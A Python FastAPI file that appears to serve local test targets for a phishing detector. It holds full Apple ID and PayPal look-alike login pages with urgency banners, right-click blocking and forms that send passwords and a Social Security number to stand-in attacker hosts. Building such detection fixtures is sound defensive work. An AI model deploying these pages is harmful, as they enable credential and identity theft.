"""
Safe Local Phishing & Social Engineering Simulation Server
Runs on localhost:8001 to host realistic, interactive demonstration targets
without relying on live Internet phishing sites that get taken down by registrars.
"""
import uvicorn
from fastapi import FastAPI, Response
from fastapi.responses import HTMLResponse

sim_app = FastAPI(title="PhishGuard Safe Simulation Server")

APPLE_PHISH_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>Apple ID - Sign In to Manage Your Account</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 18px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); width: 100%; max-width: 400px; text-align: center; }
        .logo { font-size: 40px; margin-bottom: 10px; }
        h1 { font-size: 22px; margin-bottom: 25px; color: #1d1d1f; }
        .urgent-banner { background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0071e3; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; }
        iframe.hidden-tracker { display: none; width: 0; height: 0; }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="card">
        <div class="logo"></div>
        <div class="urgent-banner">⚠️ Account suspended: verify your identity immediately</div>
        <h1>Sign In with Apple ID</h1>
        <!-- Form deliberately points to external attacker data-drop server over plain HTTP -->
        <form action="http://data-collector-harvest.net/steal.php" method="POST">
            <input type="text" name="apple_id" placeholder="Apple ID (Email or Phone)" required />
            <input type="password" name="password" placeholder="Password" required />
            <button type="submit">Continue</button>
        </form>
        <iframe class="hidden-tracker" src="about:blank"></iframe>
    </div>
</body>
</html>
"""

PAYPAL_PHISH_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>PayPal: Account Verification Notice</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f6f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .box { background: white; padding: 35px; border-radius: 10px; border: 1px solid #e1e7ec; width: 380px; text-align: center; }
        h2 { color: #003087; margin-bottom: 20px; }
        .alert { background: #fff3cd; color: #856404; padding: 10px; font-size: 12px; border-radius: 4px; margin-bottom: 15px; }
        input { width: 100%; padding: 11px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0070ba; color: white; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>PayPal</h2>
        <div class="alert">Unauthorized access detected: Confirm your billing details</div>
        <form action="http://exfiltrate-creds-drop.org/capture" method="POST">
            <input type="email" name="email" placeholder="Email address" required />
            <input type="password" name="password" placeholder="Password" required />
            <input type="text" name="ssn" placeholder="Social Security Number / Tax ID" required />
            <button type="submit">Verify Identity</button>
        </form>
    </div>
</body>
</html>
"""

LEGIT_PORTAL_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>Enterprise Security Portal - Clean Benchmark</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fafafa; padding: 40px; color: #333; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        h1 { color: #111; }
        p { line-height: 1.6; color: #555; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Enterprise Documentation Benchmark</h1>
        <p>This is a standard informational webpage demonstrating authentic, legitimate characteristics:</p>
        <ul>
            <li>No unverified external credential form targets</li>
            <li>No hidden clickjacking iframes</li>
            <li>No anti-analysis right-click prevention scripts</li>
            <li>Standard secure browsing posture</li>
        </ul>
    </div>
</body>
</html>
"""

@sim_app.get("/sim/apple-phish", response_class=HTMLResponse)
def get_apple_phish():
    return APPLE_PHISH_HTML

@sim_app.get("/sim/paypal-phish", response_class=HTMLResponse)
def get_paypal_phish():
    return PAYPAL_PHISH_HTML

@sim_app.get("/sim/legitimate-page", response_class=HTMLResponse)
def get_legit_page():
    return LEGIT_PORTAL_HTML

if __name__ == "__main__":
    uvicorn.run(sim_app, host="127.0.0.1", port=8001)
